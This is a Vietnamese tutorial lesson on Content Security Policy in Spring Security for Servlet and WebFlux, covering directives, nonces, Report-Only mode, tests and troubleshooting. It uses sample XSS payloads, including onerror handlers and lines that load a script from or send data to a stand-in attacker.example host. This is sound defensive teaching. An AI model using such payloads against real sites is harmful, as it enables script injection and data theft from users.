# CSP và vai trò giảm tác động của nội dung bị chèn

> **Chương:** Chính sách nội dung CSP  
> **Phạm vi:** Bảo vệ ứng dụng web bằng Spring Security ở cả Servlet và Reactive.

## 1. Vì sao ứng dụng cần CSP?

Bài học thuộc mô-đun `SPRING_SECURITY_HTTP_PROTECTION`: áp dụng các lớp phòng vệ HTTP và trình duyệt trong Spring Security, từ CSRF, CORS, security headers, CSP, HSTS đến HTTP firewall và bảo vệ session. Ở đây, trọng tâm là **Content Security Policy (CSP)**: cách giảm khả năng thực thi và giới hạn tác hại của nội dung không đáng tin cậy bị chèn vào trang. Người học sẽ liên hệ cơ chế này với cấu hình cho Servlet và Reactive, thử các tình huống tấn công web và phân tích xung đột khi triển khai.

Hãy hình dung một trang tin hiển thị bình luận. Lập trình viên vô tình đưa chuỗi bình luận vào HTML mà không mã hóa ký tự đặc biệt:

~~~html
<!-- Minh họa một lỗi: dữ liệu bình luận được chèn thành HTML -->
<div class="comment">
  <img src="khong-ton-tai" onerror="alert('XSS')">
</div>
~~~

Nếu trình duyệt coi nội dung này là markup và cho phép thực thi bộ xử lý sự kiện `onerror`, mã JavaScript do người gửi bình luận lựa chọn có thể chạy trong ngữ cảnh của website. Đây là một dạng **cross-site scripting (XSS)**. Một payload thực tế có thể thao tác giao diện, gửi yêu cầu dưới danh tính phiên đăng nhập, đọc dữ liệu mà JavaScript có quyền truy cập hoặc đánh lừa người dùng.

Phòng thủ đầu tiên vẫn là xử lý dữ liệu đúng ngữ cảnh: mã hóa HTML khi xuất văn bản, tránh các API DOM không an toàn và làm sạch HTML nếu ứng dụng thực sự cho phép người dùng nhập HTML. Tuy nhiên, một lỗi có thể lọt qua hoặc phát sinh ở thư viện giao diện. **CSP là lớp phòng vệ bổ sung do trình duyệt thực thi**, nhằm giảm cơ hội biến lỗi chèn nội dung thành việc chạy script tùy ý và hạn chế một số đường tải tài nguyên, kết nối mạng hoặc gửi biểu mẫu.

Sau bài học, bạn cần giải thích được:

1. CSP được gửi từ đâu và trình duyệt quyết định chặn hành vi như thế nào.
2. Vì sao CSP có thể giảm tác động của XSS nhưng không sửa lỗi chèn dữ liệu gốc.
3. Cách thiết lập chính sách cơ bản với Spring Security Servlet và WebFlux.
4. Cách quan sát vi phạm, kiểm tra chính sách và nhận biết cấu hình quá rộng.

## 2. Cơ chế: máy chủ công bố chính sách, trình duyệt thực thi

Máy chủ có thể trả header HTTP `Content-Security-Policy` cùng tài liệu HTML:

~~~http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'
~~~

Các *directive* là quy tắc riêng cho từng loại hành vi. Trong ví dụ:

- `default-src 'self'` đặt nguồn dự phòng là cùng origin đối với những loại tài nguyên có hỗ trợ fallback.
- `script-src 'self'` chỉ cho phép tải script từ cùng origin; **không** tự động cho phép script nội tuyến, thuộc tính xử lý sự kiện như `onclick`/`onerror` hay `javascript:` URL.
- `object-src 'none'` cấm nội dung plugin nhúng qua `object`/`embed`.
- `base-uri 'self'` giới hạn URL của thẻ `<base>` để tránh thay đổi cách phân giải liên kết tương đối.
- `form-action 'self'` giới hạn đích gửi form về cùng origin.

`'self'` là **cùng origin** (scheme, host và port), không đồng nghĩa với mọi subdomain. `'none'` nghĩa là không có nguồn nào được phép. Các từ khóa CSP như `'self'`, `'none'`, `'unsafe-inline'` phải được đặt trong dấu nháy đơn bên trong giá trị header.

Luồng xử lý có thể hình dung như sau:

~~~mermaid
flowchart TD
    A[Trình duyệt nhận trang HTML và header CSP] --> B[Phân tích các directive]
    B --> C[Trang yêu cầu chạy script hoặc tải tài nguyên]
    C --> D{Hành vi phù hợp với CSP?}
    D -- Có --> E[Trình duyệt cho phép theo các kiểm tra thông thường]
    D -- Không --> F[Trình duyệt chặn hành vi]
    F --> G[Thông báo vi phạm trong DevTools; gửi report nếu đã cấu hình]
~~~

**Ranh giới quan trọng:** CSP không xem xét dữ liệu đầu vào có “độc hại” hay không và không xóa phần HTML bị chèn. CSP quyết định các hành vi của trang có phù hợp với chính sách hay không. HTML giả mạo nút đăng nhập vẫn có thể xuất hiện, ngay cả khi script nội tuyến bị chặn.

### Các directive thường liên quan đến nội dung bị chèn

| Directive | Điều khiển | Vai trò phòng vệ |
|---|---|---|
| `script-src` | Nguồn và cách thực thi JavaScript | Giảm cơ hội thực thi script hoặc handler do kẻ tấn công chèn |
| `script-src-attr` | JavaScript trong thuộc tính xử lý sự kiện | Tinh chỉnh quy tắc đối với `onclick`, `onerror`; khi không khai báo, trình duyệt dùng quy tắc fallback thích hợp |
| `object-src` | `object`, `embed` và nội dung plugin | Thu hẹp các bề mặt nội dung chủ động cũ |
| `base-uri` | Giá trị `<base href="...">` | Giảm rủi ro bẻ hướng URL tương đối trong tài liệu |
| `connect-src` | Kết nối do script khởi tạo như `fetch`, XHR, WebSocket | Giới hạn các đích gửi/nhận dữ liệu qua API của script |
| `img-src` | Nguồn ảnh | Hạn chế một đường tải tài nguyên ra ngoài, bao gồm ảnh chèn |
| `form-action` | Đích submit biểu mẫu | Giảm khả năng gửi biểu mẫu tới domain ngoài ý muốn |
| `frame-ancestors` | Nguồn được phép nhúng **trang hiện tại** vào frame | Hạn chế việc trang bị nhúng trái phép; hỗ trợ chống clickjacking |
| `style-src` | Nguồn CSS và các kiểu nội tuyến theo fallback | Giới hạn stylesheet; có thể ảnh hưởng thư viện UI dùng inline style |
| `default-src` | Giá trị dự phòng cho nhiều fetch directive | Giúp mặc định đóng hơn khi quên khai báo loại tài nguyên cụ thể |

Không phải directive nào cũng kế thừa `default-src`: đáng chú ý, **`form-action`, `frame-ancestors` và `base-uri` cần được cấu hình riêng**. Ngoài ra, `frame-ancestors` kiểm soát ai nhúng trang của bạn, còn `frame-src` kiểm soát các frame mà *trang của bạn* được tải.

## 3. CSP làm giảm tác động của nội dung bị chèn ra sao?

Xét chính sách:

~~~http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; connect-src 'self'; img-src 'self'
~~~

**Tình huống A — chèn mã thực thi nội tuyến.** Một bình luận chứa `<script>alert('XSS')</script>` hoặc thẻ ảnh với `onerror="alert('XSS')"`. Nếu nội dung bị chèn được trình duyệt phân tích như HTML có khả năng thực thi, `script-src 'self'` không cấp quyền cho JavaScript nội tuyến. Trình duyệt chặn phần thực thi và ghi vi phạm CSP. Việc script có chạy được trong một điểm chèn cụ thể còn phụ thuộc vào cách ứng dụng tạo DOM; CSP là một điều kiện chặn bổ sung.

**Tình huống B — chèn script tải từ domain ngoài.** Một payload cố gắng thêm `<script src="https://attacker.example/payload.js"></script>`. Nguồn script này không cùng origin với ứng dụng, nên vi phạm `script-src 'self'`. Tuy vậy, một script đặt trên **chính origin được cho phép** có thể vẫn được tải. Vì vậy, chính sách chỉ dựa trên danh sách host không bảo vệ tuyệt đối khỏi XSS nếu chính origin có đường tải script không đáng tin cậy.

**Tình huống C — gửi dữ liệu ra ngoài.** Nếu một đoạn script độc hại đã chạy được, `connect-src 'self'` có thể chặn `fetch`/XHR tới máy chủ ngoài; `form-action 'self'` và `img-src 'self'` giảm thêm các đường gửi dữ liệu qua form và tải ảnh. Đây là các giới hạn **theo từng cơ chế**: chúng không phải cam kết rằng mọi cách rò rỉ hoặc chuyển hướng đều bị ngăn.

**Tình huống D — chèn giao diện giả mạo.** Kẻ tấn công chèn một biểu mẫu trông như form đăng nhập. CSP không tự xóa biểu mẫu đó. `form-action 'self'` có thể chặn submit trực tiếp tới domain ngoài, nhưng không thể đảm bảo nội dung hiển thị là chính xác hoặc không lừa đảo. Ứng dụng vẫn phải xử lý nguồn HTML không đáng tin cậy.

Kết luận theo mô hình phòng vệ nhiều lớp:

| Lớp bảo vệ | Giải quyết điều gì? | Không giải quyết điều gì? |
|---|---|---|
| Escape theo ngữ cảnh, template tự escape | Ngăn chuỗi dữ liệu bị diễn giải thành mã HTML/JS | Không tự bảo vệ mọi đường chèn khác hoặc plugin lỗi |
| HTML sanitizer đáng tin cậy | Giới hạn markup khi sản phẩm cho nhập HTML | Không đảm bảo tuyệt đối trước mọi lỗi cấu hình hoặc trình duyệt |
| CSP có `script-src` nghiêm ngặt | Giảm khả năng chạy JavaScript không được cấp phép | Không sửa DOM đã bị chèn, không thay thế chống XSS từ nguồn |
| `connect-src`, `form-action`, `img-src` | Thu hẹp một số đường liên lạc với nguồn ngoài | Không chặn mọi đường điều hướng, rò rỉ hay hành vi script cùng origin |
| Cookie `HttpOnly`/`Secure`/`SameSite`, CSRF protection | Giảm tác động của các nhóm tấn công khác lên phiên và yêu cầu HTTP | Không thay cho CSP hoặc xử lý XSS |

Ví dụ với Thymeleaf, khi hiển thị bình luận dạng văn bản, ưu tiên:

~~~html
<p th:text="${comment}"></p>
~~~

Thymeleaf sẽ escape nội dung trong `th:text` theo ngữ cảnh HTML. Nếu đổi thành `th:utext` để đưa HTML không đáng tin cậy vào DOM, ứng dụng tạo thêm bề mặt chèn nội dung; việc đã bật CSP không làm lựa chọn này trở nên an toàn.

## 4. Thiết kế chính sách khởi đầu hợp lý

Với một ứng dụng demo phục vụ toàn bộ JavaScript, CSS và ảnh từ cùng origin, có thể bắt đầu bằng:

~~~http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
~~~

Đây là **chính sách minh họa**, cần điều chỉnh theo tài nguyên thực tế. Nó không cho phép inline JavaScript hoặc inline CSS, chặn script và stylesheet từ CDN ngoài, đồng thời không cho trang khác nhúng ứng dụng vào frame. Nếu frontend dùng CDN, WebSocket, OAuth redirect, font ngoài, widget hoặc công cụ đo lường, phải phân tích từng yêu cầu để mở đúng directive tương ứng. Ví dụ, WebSocket có thể cần thêm endpoint `wss://...` vào `connect-src`.

Một vài nguyên tắc khi mở rộng:

1. Bắt đầu với những nguồn thật sự dùng; ghi rõ origin và loại tài nguyên thay vì thêm `*` hoặc `https:` quá rộng.
2. Tránh `'unsafe-inline'` trong `script-src`: cho phép script nội tuyến thông thường và làm mất một phần lớn giá trị chống XSS. Tránh `'unsafe-eval'` trừ khi đã hiểu rõ tác động.
3. Tránh tự động cho phép `data:`/`blob:` trong `script-src`. Với `img-src`, `data:` đôi khi là nhu cầu hợp lệ, nhưng vẫn cần quyết định có chủ đích.
4. Đặt `object-src 'none'` và `base-uri` phù hợp; không phụ thuộc vào `default-src` để bảo vệ chúng.
5. Kiểm tra chính sách trên **response HTML thực tế**, kể cả các trang lỗi và trang đăng nhập do hệ thống phục vụ; CSP chỉ áp dụng khi trình duyệt nhận được chính sách thích hợp cho tài liệu đó.

Nếu ứng dụng còn cần inline script hợp lệ, ưu tiên chuyển sang file script tĩnh hoặc dùng **nonce/hash** có kiểm soát thay vì bật `'unsafe-inline'`:

- **Nonce:** máy chủ tạo giá trị khó đoán mới cho **từng HTTP response**, đưa cùng giá trị vào `script-src 'nonce-...'` và thuộc tính `nonce` của những thẻ `script` tin cậy. Nonce không được hard-code hoặc tái sử dụng cố định. Với HTML được cache, phải đảm bảo header và nội dung trang chứa nonce khớp trong cùng response.
- **Hash:** khai báo `'sha256-...'` cho chính xác nội dung của script nội tuyến ổn định. Chỉ một thay đổi nhỏ trong script cũng đòi hỏi tính lại hash.
- **`'strict-dynamic'`:** kết hợp với nonce hoặc hash để những script đã được tin cậy có thể tải tiếp script trong các trình duyệt hỗ trợ. Tính năng này thay đổi cách áp dụng danh sách host; cần xem xét kỹ chuỗi tải script và kiểm thử trình duyệt đích.

Ví dụ **chỉ minh họa mối liên hệ**, không dùng nonce trong ví dụ làm giá trị cố định ngoài thực tế:

~~~http
Content-Security-Policy: script-src 'nonce-r4nD0mV4luE6Cw9'; object-src 'none'; base-uri 'none'
~~~

~~~html
<script nonce="r4nD0mV4luE6Cw9">
  initializeApp();
</script>
~~~

Việc cấu hình `policyDirectives(...)` trong Spring Security **không tự tạo hoặc tự gắn nonce** cho HTML. Muốn dùng nonce cần thiết kế luồng tạo giá trị cho mỗi response, truyền giá trị cho bộ render template và đặt header nhất quán. Tránh cấu hình hai giá trị CSP chồng chéo mà không hiểu rằng trình duyệt sẽ thực thi từng chính sách đã nhận.

## 5. Cấu hình Spring Security cho Servlet

Trong ứng dụng Spring MVC chạy trên Servlet stack, khai báo chính sách qua `SecurityFilterChain`. Ví dụ dưới đây phù hợp với cách viết cấu hình lambda DSL của các phiên bản Spring Security hiện đại:

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

// Đặt trong lớp @Configuration phù hợp của ứng dụng.
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self'; " +
                "img-src 'self'; " +
                "connect-src 'self'; " +
                "object-src 'none'; " +
                "base-uri 'self'; " +
                "form-action 'self'; " +
                "frame-ancestors 'none'"
            )
        )
    );

    return http.build();
}
~~~

Spring Security có thể thiết lập một số security header mặc định, nhưng **không tự chọn CSP thay ứng dụng**, vì danh sách nguồn hợp lệ phụ thuộc vào giao diện và các tích hợp đang dùng. Sau khi thêm cấu hình, dùng công cụ Network của trình duyệt hoặc `curl` để xác nhận response của tài liệu HTML có header:

~~~bash
curl -I http://localhost:8080/
~~~

Nếu `/` chuyển hướng, trả lỗi hoặc có proxy/CDN phía trước, hãy kiểm tra cả response của trang HTML cuối cùng mà trình duyệt thực sự render. Một header chỉ có ở response của API JSON sẽ không tự đặt chính sách cho trang HTML do một origin khác phục vụ.

## 6. Cấu hình Spring Security cho Reactive (WebFlux)

Với WebFlux, áp dụng cùng ý tưởng thông qua `SecurityWebFilterChain` và `ServerHttpSecurity`:

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.web.server.SecurityWebFilterChain;

// Đặt trong lớp @Configuration phù hợp của ứng dụng WebFlux.
@Bean
SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self'; " +
                "img-src 'self'; " +
                "connect-src 'self'; " +
                "object-src 'none'; " +
                "base-uri 'self'; " +
                "form-action 'self'; " +
                "frame-ancestors 'none'"
            )
        )
    );

    return http.build();
}
~~~

Khác biệt chính nằm ở API cấu hình security của Servlet và Reactive; **bên thực thi CSP vẫn là trình duyệt**. Khi frontend chạy trên domain riêng và chỉ gọi backend WebFlux qua API, CSP của tài liệu frontend cần được cấu hình ở nơi trả trang HTML (frontend server, reverse proxy hoặc CDN). CSP không phải cơ chế quyết định yêu cầu cross-origin có được backend chấp nhận hay không; trách nhiệm đó thuộc chính sách CORS.

## 7. Kiểm chứng bằng kịch bản tấn công và công cụ trình duyệt

Để đánh giá đúng, cần phân biệt **header đã được trả về** với **cơ chế chặn đã thực sự hoạt động**. Một quy trình có thể lặp lại:

1. Mở trang HTML được phục vụ từ ứng dụng đã cấu hình. Trong Network, chọn request tài liệu và xác nhận `Content-Security-Policy` xuất hiện trong response header.
2. Trong môi trường thực hành, tạo một điểm hiển thị HTML không đáng tin cậy có chủ đích. Thử chèn `<img src="x" onerror="alert('xss')">`. Với chính sách `script-src 'self'` và không có cấp phép nội tuyến phù hợp, handler này phải bị chặn.
3. Xem Console hoặc tab Issues của DevTools: trình duyệt thường báo script nội tuyến bị từ chối theo directive `script-src`.
4. Thử tải script từ origin ngoài và kiểm tra request hoặc thông báo vi phạm; sau đó thử tải script tĩnh từ chính origin để nhận thấy giới hạn của policy dựa trên host.
5. Thử tải stylesheet, font hoặc ảnh mà ứng dụng thật sự cần. Nếu bị chặn, xác định directive nào gây lỗi và mở đúng nguồn cần thiết.
6. Chuyển sang chính sách báo cáo trước khi áp dụng rộng ở hệ thống đang vận hành, theo dõi các vi phạm hợp lệ và triển khai dần chính sách chặn.

Một bảng kỳ vọng khi dùng chính sách ở mục 4:

| Hành vi kiểm thử trong trang | Kết quả kỳ vọng | Lý do |
|---|---|---|
| Chạy `onerror="alert(1)"` do nội dung chèn vào | Bị chặn | Không cho inline handler/script |
| Nạp `https://attacker.example/x.js` | Bị chặn | Không thuộc `script-src 'self'` |
| Nạp `/js/app.js` hợp lệ từ cùng origin | Có thể được phép | Phù hợp nguồn `'self'`, miễn không bị giới hạn bởi chính sách khác |
| `fetch("https://attacker.example/collect")` từ script đã chạy | Bị chặn bởi CSP | `connect-src 'self'` |
| Submit form sang `https://attacker.example/login` | Bị chặn bởi CSP | `form-action 'self'` |
| Chèn đoạn HTML giả mạo nhưng không chạy JS | Vẫn có thể hiển thị | CSP không làm sạch DOM |
| Trang ngoài nhúng trang hiện tại vào `iframe` | Bị chặn | `frame-ancestors 'none'` |

**Lưu ý về phương pháp thử:** các ví dụ payload chỉ dành cho môi trường học tập có quyền kiểm soát. Một script tự viết chạy trong Console DevTools có thể chịu điều kiện khác với script được chèn vào HTML, nên hãy xác định rõ điểm chèn và đường thực thi trước khi kết luận CSP đã chặn một lỗ hổng.

### Kiểm tra tự động header với Servlet

Khi ứng dụng có route `/` dành cho kiểm thử, có thể dùng MockMvc xác nhận chính sách hiện diện:

~~~java
import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;

// Trong một lớp test đã cấu hình MockMvc và Spring Security filters.
mockMvc.perform(get("/"))
    .andExpect(header().string(
        "Content-Security-Policy",
        containsString("script-src 'self'")
    ));
~~~

### Kiểm tra tự động header với Reactive

~~~java
// Trong một lớp test WebTestClient trỏ tới route HTML thực tế.
webTestClient.get()
    .uri("/")
    .exchange()
    .expectHeader()
    .valueMatches(
        "Content-Security-Policy",
        ".*script-src 'self'.*"
    );
~~~

Các test này xác nhận **tầng server trả header**, không thay thế kiểm thử trình duyệt đối với inline script, DOM XSS hoặc khả năng tương thích của ứng dụng.

## 8. Report-Only: quan sát vi phạm trước khi chặn

Với website đang hoạt động, bật ngay CSP chặt có thể làm hỏng frontend vì thư viện dùng inline script, style nội tuyến, font ngoài hoặc các endpoint kết nối chưa được liệt kê. Trình duyệt hỗ trợ header riêng:

~~~http
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
~~~

Ở chế độ **Report-Only**, trình duyệt đánh giá chính sách và ghi nhận vi phạm, nhưng **không chặn hành vi chỉ vì policy báo cáo này**. Đây là cách thăm dò trước khi đưa chính sách sang header `Content-Security-Policy` để thực thi. Nếu response đồng thời có một CSP đang thực thi khác, CSP đó vẫn có thể chặn hành vi.

Có thể thu thập báo cáo vi phạm bằng cơ chế Reporting API (ví dụ `Reporting-Endpoints`/`report-to` ở môi trường hỗ trợ) hoặc `report-uri` cho tương thích với một số trình duyệt cũ; cần kiểm tra hỗ trợ trình duyệt và cấu hình endpoint thu thập thực tế. **Đặt mỗi header Report-Only không đồng nghĩa với việc báo cáo sẽ tự gửi đến server.** Vi phạm cũng có thể được quan sát trong DevTools.

Khi phân tích report, chú ý các vấn đề:

- **Vi phạm hợp lệ:** script nội tuyến do ứng dụng tạo, script bên thứ ba, stylesheet động, CDN được dùng thật. Cân nhắc chuyển script ra file, dùng nonce/hash hoặc cho phép chính xác nguồn cần thiết.
- **Nhiễu:** extension trình duyệt, công cụ phát triển và thay đổi từ bên thứ ba có thể tạo báo cáo không đại diện cho người dùng thông thường.
- **Dữ liệu và tải hệ thống:** báo cáo có thể chứa URL hoặc thông tin trang; giảm dữ liệu nhạy cảm trong log, kiểm soát truy cập endpoint và giới hạn lưu lượng.
- **Khả năng tương thích:** không phải mọi directive và cơ chế reporting đều được hỗ trợ đồng nhất; thử trên các trình duyệt mục tiêu.

Lộ trình thực tế: (1) kiểm kê nguồn tài nguyên, (2) thử Report-Only và phân tích, (3) loại bỏ script/style nội tuyến không cần thiết, (4) thực thi chính sách trên một phạm vi kiểm soát được, (5) quan sát lỗi và điều chỉnh có chủ đích.

## 9. Chẩn đoán các lỗi CSP thường gặp

| Dấu hiệu | Nguyên nhân thường thấy | Hướng xử lý |
|---|---|---|
| Trang tải nhưng nút hoặc menu không hoạt động | Script nội tuyến hoặc handler `onclick` bị chặn | Chuyển logic sang file JS hợp lệ hoặc dùng nonce/hash |
| CSS mất hiệu lực, giao diện sai | `style-src` không cho stylesheet hoặc inline style | Kiểm tra nguồn CSS thực tế; điều chỉnh directive đúng phạm vi |
| Frontend không gọi được API dù backend vẫn chạy | `connect-src` không cho origin API | Thêm API origin đúng vào `connect-src`; kiểm tra CORS riêng |
| Không tải được WebSocket | `connect-src` không cho `wss://...` | Khai báo đúng WebSocket endpoint |
| Lỗi chỉ xảy ra sau khi qua CDN/reverse proxy | Header thiếu, bị thay đổi hoặc có nhiều CSP cùng áp dụng | So sánh response thực tế ở browser với response từ ứng dụng và proxy |
| CSP có trong API response nhưng trang vẫn chạy script bị chèn | HTML do một dịch vụ/origin khác cung cấp hoặc CSP quá rộng | Kiểm tra response của tài liệu HTML; rà lại `script-src` |
| Có báo cáo nhưng script vẫn chạy | Đang dùng `Content-Security-Policy-Report-Only` | Chuyển chính sách phù hợp sang header thực thi sau khi thử nghiệm |
| Đã đặt `default-src 'none'` nhưng form vẫn gửi ra ngoài | Không có `form-action` | Cấu hình `form-action` trực tiếp |

Một số bẫy cấu hình cần nhận diện:

- **Thêm `'unsafe-inline'` để “sửa nhanh” giao diện:** loại bỏ chặn quan trọng nhất đối với nhiều payload XSS.
- **Cho phép mọi CDN hoặc wildcard:** một nguồn được tin cậy nhưng bị xâm nhập có thể cung cấp script độc hại; danh sách host rộng làm giảm độ mạnh của CSP.
- **Dùng nonce cố định:** kẻ tấn công có thể học và gắn giá trị đó vào script bị chèn; nonce cần không thể đoán và thay đổi theo response.
- **Chỉ đặt CSP trong thẻ `<meta http-equiv="Content-Security-Policy">`:** meta có giới hạn, chẳng hạn không hỗ trợ `frame-ancestors` và Report-Only; header HTTP là lựa chọn ưu tiên.
- **Nhầm CSP với CORS hoặc CSRF:** CSP hướng dẫn hành vi tải/thực thi ở trình duyệt trên tài liệu, CORS quy định khả năng frontend đọc response cross-origin và CSRF protection xử lý nguy cơ yêu cầu giả mạo; từng lớp có vai trò riêng.
- **Tin rằng CSP bảo vệ tuyệt đối:** lỗi DOM XSS, HTML injection, script từ nguồn được phép, hành vi do người dùng tự thực hiện và các kênh không nằm trong phạm vi directive vẫn cần biện pháp khác.

## 10. Bài thực hành và câu hỏi tự đánh giá

**Bài thực hành:** Tạo trang demo có một file `/js/app.js`, một file `/css/app.css` và khu vực hiển thị nội dung bình luận được escape đúng. Cấu hình CSP theo mục 4 cho Servlet hoặc WebFlux, rồi:

1. Xác nhận các file tĩnh cùng origin vẫn tải được và header CSP có trên trang HTML.
2. Trong môi trường thử nghiệm riêng, chủ động tạo một điểm chèn HTML để kiểm chứng handler `onerror` bị chặn; ghi lại thông báo của DevTools.
3. Thử một script từ origin ngoài, một stylesheet ngoài và một yêu cầu `fetch` tới origin ngoài. Ghi directive gây vi phạm cho từng hành vi.
4. Chuyển sang Report-Only, quan sát sự khác biệt giữa “có vi phạm” và “bị chặn”.
5. Khắc phục các vi phạm của frontend hợp lệ bằng thay đổi code hoặc mở nguồn tối thiểu; không thêm `'unsafe-inline'` chỉ để bỏ lỗi.

**Tự kiểm tra:**

- Vì sao `script-src 'self'` có thể chặn `onerror`, nhưng vẫn không đảm bảo mọi XSS đều thất bại?
- Khi nào cần `connect-src` và khi nào cần CORS, và tại sao hai cơ chế không thể thay thế nhau?
- Vì sao `default-src` không đủ để giới hạn đích gửi form hoặc trang nào được nhúng trang hiện tại?
- Header CSP ở backend API có bảo vệ được trang HTML được phát từ CDN frontend khác origin không?
- Điều gì phải đồng bộ giữa nonce trong CSP header và nonce trong thẻ `script` của từng response?

## 11. Ghi nhớ

CSP là **lớp phòng vệ trình duyệt bổ sung** giúp hạn chế script và tài nguyên được thực thi hoặc tải khi ứng dụng có lỗi chèn nội dung. Nó có thể giảm tác động của nhiều tình huống XSS và giới hạn một số kênh liên lạc, nhưng không loại bỏ HTML độc hại khỏi DOM, không thay thế escape/sanitize theo ngữ cảnh và không bảo vệ tuyệt đối trước script từ nguồn đã được tin cậy.

Khi áp dụng với Spring Security, hãy cấu hình chính sách ở response của **trang HTML thực tế**, kiểm tra ở cả Servlet và WebFlux theo kiến trúc triển khai, bắt đầu bằng nguồn tối thiểu, xử lý inline script bằng cách thiết kế code/nonce/hash phù hợp, thử Report-Only và xác minh hành vi bằng trình duyệt trước khi đưa vào thực thi rộng.
